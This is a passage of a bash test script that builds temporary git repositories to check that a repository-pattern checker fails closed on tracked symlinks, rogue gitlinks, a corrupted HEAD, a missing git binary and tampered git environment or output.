# pass: a corrupt HEAD makes the toplevel probe error, and a tracked symlink
# outside `prose` (find cannot see it) must not ride through -----------------
r="$work/sym-probe-corrupt-head"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/outside-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
printf 'garbage, not a ref\n' > "$r/.git/HEAD"
fails_with "$r" "$sym_probe_msg" "a .git whose toplevel probe errors must fail closed, not skip the git pass"

# --- a .git at $root whose core.worktree points elsewhere resolves a
# different toplevel: fail closed, never scan the other tree -----------------
r="$work/sym-probe-worktree"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/outside-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
mkdir -p "$work/sym-probe-worktree-elsewhere"
git -C "$r" config core.worktree "$work/sym-probe-worktree-elsewhere"
fails_only_with "$r" "$sym_top_msg" "a .git whose core.worktree points away from \$root must fail closed"

# --- a .git at $root with git absent from PATH fails CLOSED -----------------
# PATH is an explicit allowlist: every external tool bin/check-patterns runs
# (bash for its shebang via env), resolved from the real PATH, and never git.
# A new tool there makes it print "command not found", failed below.
nogit_bin="$work/nogit-bin"; mkdir -p "$nogit_bin"
for t in bash env grep sed find mktemp cat sort rm; do
  # type -P: a PATH file only, never a builtin, function or alias of that name.
  t_path="$(type -P "$t" || true)"
  [ -n "$t_path" ] || fail "the git-less PATH fixture needs '$t', which is not on PATH"
  ln -s "$t_path" "$nogit_bin/$t"
done
# A FRESH shell: in-process, `PATH=x command -v git` can be answered from
# this shell's hash of the git it already ran (seen on macOS's bash 3.2).
if nogit_git="$(PATH="$nogit_bin" "$nogit_bin/bash" -c 'command -v git')"; then
  {
    echo "  git-less PATH: $nogit_bin -> git resolves as '$nogit_git'"
    PATH="$nogit_bin" "$nogit_bin/bash" -c 'type -a git' 2>&1
    ls -la "$nogit_bin"
  } >&2
  fail "the git-less PATH fixture still resolves git"
fi
r="$work/sym-nogit"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
nogit_rc=0
nogit_out="$(PATH="$nogit_bin" STRICT= "$cp" "$r" 2>&1)" || nogit_rc=$?
[ "$nogit_rc" != "0" ] || fail "a .git at root with git absent from PATH must fail closed (rc 0)"
case "$nogit_out" in
  *"command not found"*) fail "the git-less PATH fixture lacks a tool bin/check-patterns runs: $nogit_out" ;;
esac
case "$nogit_out" in
  *"$sym_nogit_msg"*) ok ;;
  *) fail "a .git at root with git absent from PATH: expected '$sym_nogit_msg', got: $nogit_out" ;;
esac

# --- GIT_TRACE / GIT_TRACE2 on stderr (not local env vars, so not stripped)
# must not corrupt the first NUL record: a first-sorting tracked symlink
# outside `prose` ('!a-link' sorts before every letter and '.') -------------
r="$work/sym-git-trace"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/!a-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
for tv in GIT_TRACE GIT_TRACE2; do
  trace_rc=0
  trace_out="$(env "$tv=1" STRICT= "$cp" "$r" 2>&1)" || trace_rc=$?
  [ "$trace_rc" != "0" ] || fail "$tv=1 must not hide a first-sorting tracked symlink (rc 0)"
  case "$trace_out" in
    *"$sym_git_stderr_msg"*) ok ;;
    *) fail "$tv=1: expected '$sym_git_stderr_msg', got: $trace_out" ;;
  esac
done
# the same trace aimed at stdout lands in the probe's and the listing's
# output: whichever branch sees it first must fail closed
for tv in GIT_TRACE GIT_TRACE2; do
  trace_rc=0
  trace_out="$(env "$tv=/dev/stdout" STRICT= "$cp" "$r" 2>&1)" || trace_rc=$?
  [ "$trace_rc" != "0" ] || fail "$tv=/dev/stdout must not hide a first-sorting tracked symlink (rc 0)"
  case "$trace_out" in
    *"- failing closed"*) ok ;;
    *) fail "$tv=/dev/stdout: expected a fail-closed message, got: $trace_out" ;;
  esac
done
# a listing record that is not '<mode> <oid> <stage><TAB><path>' fails closed
# rather than being skipped: a git wrapper on PATH corrupts ONLY the ls-files
# output (the probe stays clean), prepended to the first record or appended
# as an unterminated last one
real_git="$(command -v git)"
for how in prepend append; do
  shim="$work/git-shim-$how"; mkdir -p "$shim"
  {
    printf '#!/bin/sh\n'
    printf 'case " $* " in *" ls-files "*) ;; *) exec "%s" "$@" ;; esac\n' "$real_git"
    [ "$how" = prepend ] && printf "printf 'noise'\n"
    printf '"%s" "$@" || exit $?\n' "$real_git"
    [ "$how" = append ] && printf "printf 'noise'\n"
    printf 'exit 0\n'
  } > "$shim/git"
  chmod u+x "$shim/git"
  rec_rc=0
  rec_out="$(PATH="$shim:$PATH" STRICT= "$cp" "$r" 2>&1)" || rec_rc=$?
  [ "$rec_rc" != "0" ] || fail "a malformed ($how) listing record must fail closed (rc 0)"
  case "$rec_out" in
    *"$sym_git_record_msg"*) ok ;;
    *) fail "a malformed ($how) listing record: expected '$sym_git_record_msg', got: $rec_out" ;;
  esac
done

# --- the git pass ALONE, under a leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE:
# the tracked symlink is gone from disk (find is clean), so only the git pass
# can see it, and only if it scans $root rather than the sentinel ------------
r="$work/sym-git-only-steer"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/lib/evil-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
rm "$r/lib/evil-link"
GIT_DIR="$steer_sentinel/.git" GIT_WORK_TREE="$steer_sentinel" \
  GIT_INDEX_FILE="$steer_sentinel/.git/index" \
  fails_only_with "$r" "$sym_git_msg" "a tracked symlink absent from disk must fail via the git pass under a leaked GIT_DIR"

# --- an existing, non-empty .gitmodules does not pin EVERY gitlink ----------
r="$work/sym-rogue-beside-pinned"; _git_repo "$r"; seed "$r"
cat > "$r/.gitmodules" <<'GM'
[submodule "zsh/plugins/fake-plugin"]
	path = zsh/plugins/fake-plugin
	url = https://example.invalid/fake-plugin.git
GM
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,zsh/plugins/fake-plugin
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,lib/rogue
git -C "$r" commit -qm "pinned plus rogue"
fails_only_with "$r" "$sym_git_msg" "a rogue gitlink beside a pinned one must fail"

# --- only submodule.<name>.path pins, and only a direct child of zsh/plugins/
i=0
for gm in 'evil|lib/evil|[evil]' \
    'evil|zsh/plugins/evil|[evil]' \
    'submodule|zsh/plugins/bare|[submodule]' \
    'submodule "lib/x"|lib/x|[submodule "lib/x"]' \
    'submodule "zsh/plugins/a/b"|zsh/plugins/a/b|[submodule "zsh/plugins/a/b"]' \
    'submodule "zsh/plugins"|zsh/plugins|[submodule "zsh/plugins"]'; do
  i=$((i + 1))
  gm_rest="${gm#*|}"; gm_path="${gm_rest%%|*}"; gm_head="${gm_rest#*|}"
  r="$work/sym-gitmodules-$i"; _git_repo "$r"; seed "$r"
  printf '%s\n\tpath = %s\n\turl = https://example.invalid/x.git\n' \
    "$gm_head" "$gm_path" > "$r/.gitmodules"
  git -C "$r" add -A && git -C "$r" commit -qm init
  git -C "$r" update-index --add --cacheinfo \
    "160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,$gm_path"
  git -C "$r" commit -qm "gitlink $gm_path"
  fails_only_with "$r" "$sym_git_msg" "gitlink '$gm_path' declared as '$gm_head' must not count as a pinned plugin"
done

# --- zsh/plugins ITSELF a symlink is reported, not pruned (no .git: find) --
r="$work/sym-plugins-is-link"; seed "$r"; mkdir -p "$r/zsh" "$r/elsewhere"
ln -s ../elsewhere "$r/zsh/plugins"
fails_only_with "$r" "$sym_msg" "zsh/plugins itself a symlink must be reported, not pruned"

# --- the prune is the ONE exact zsh/plugins path: a `plugins` dir anywhere
# else is still walked (no .git: find alone) ---------------------------------
for pdir in lib/plugins docs/plugins zsh/sub/plugins; do
  r="$work/sym-other-plugins-$(printf '%s' "$pdir" | tr '/' '-')"; seed "$r"
  mkdir -p "$r/$pdir"; ln -s ./nonexistent-target "$r/$pdir/evil-link"
  fails_only_with "$r" "$sym_msg" "a symlink under $pdir (not the pinned zsh/plugins) must be caught"
done

# --- a glob character in $root must not break the literal zsh/plugins prune
# (find -path takes a pattern; `*` and `?` still match themselves, a bracket
# expression does not) ------------------------------------------------------
r="$work/glob[x]"; seed "$r"; mkdir -p "$r/zsh/plugins"
ln -s ./nonexistent-target "$r/zsh/plugins/evil-link"
[ "$(run "$r")" = "0" ] && ok \
  || fail "a root named 'glob[x]': the pinned zsh/plugins path must still be pruned"

# --- the git pass's report carries no blank line -----------------------------
r="$work/sym-git-outside"
blank_out="$(STRICT= "$cp" "$r" 2>&1)" || true
case "$blank_out" in
  *"$sym_git_msg"*) ;;
  *) fail "the git-pass report fixture no longer fires: $blank_out" ;;
esac
case "$blank_out" in
  *$'\n\n'*) fail "the git pass's report must carry no blank line: $blank_out" ;;
  *) ok ;;
esac

echo "PASS: check_patterns_test ($pass assertions)"
